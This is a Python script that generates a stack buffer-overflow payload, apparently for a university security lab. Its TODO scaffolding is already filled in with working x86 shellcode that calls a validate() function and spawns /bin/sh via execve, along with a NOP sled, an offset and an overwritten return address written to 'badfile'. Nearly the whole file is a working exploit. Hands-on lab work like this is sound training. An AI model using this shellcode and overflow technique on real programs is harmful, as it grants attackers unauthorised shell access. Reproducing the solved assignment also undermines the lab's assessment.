#!/usr/bin/python3
import sys

def p32(x):
    """Pack a 32-bit integer in little-endian format."""
    return x.to_bytes(4, byteorder='little')

# ============================================================
# TODO: Fill in the values below based on your GDB analysis
# ============================================================

# Your Student ID (last 3 digits)
STUDENT_ID = 4               # TODO: Replace with your ID

# Token value (derived from Student ID)
TOKEN = 1000 + STUDENT_ID * 7

# Address of validate() — printed by the target program
validate_addr = 0x5655626d   # TODO: Replace

# ============================================================
# TODO: Write your custom shellcode
# ============================================================
# Your shellcode must:
#   1. Push TOKEN onto the stack
#   2. Call validate() at validate_addr
#   3. Spawn /bin/sh using execve syscall
#
# Use https://defuse.ca/online-x86-assembler.htm#disassembly
# to convert your assembly to hex bytes.
#
# Example assembly structure:

# xor eax, eax
# mov ax, 0x0404
# push eax
# mov ebx, 0x5655626d
# call ebx
# xor eax, eax
# push eax
# push 0x68732f2f
# push 0x6e69622f
# mov ebx, esp
# push eax
# push ebx
# mov ecx, esp
# cdq
# mov al, 0x0b
# int 0x80

shellcode = b"\x31\xC0\x66\xB8\x04\x04\x50\xBB\x6D\x62\x55\x56\xFF\xD3\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\x99\xB0\x0B\xCD\x80"  # TODO: Replace with your shellcode bytes

# ============================================================
# TODO: Construct the payload
# ============================================================

# Total size of the payload
read_sz = 384                  # TODO: Replace with your READ_SZ

# Offset from buffer to return address
offset = 96                   # TODO: Replace with actual offset

# Return address — should point to where your shellcode is placed
buffer_addr = 0xffffd2ec
jump_offset = 200
ret_addr = buffer_addr + jump_offset        # TODO: Replace

content = bytearray(0x90 for i in range(read_sz))  # 0x90 is NOP
content[-1] = 0x00

# TODO: Place shellcode and return address in the payload
# Strategy: 
# 1. Place shellcode at the end of the payload
start = read_sz - len(shellcode) - 1
content[start:start+len(shellcode)] = shellcode
# 2. Overwrite the return address
content[offset:offset+4] = p32(ret_addr)

# ============================================================
# Write the payload to badfile
# ============================================================
with open('badfile', 'wb') as f:
    f.write(content)

print("badfile generated successfully!")
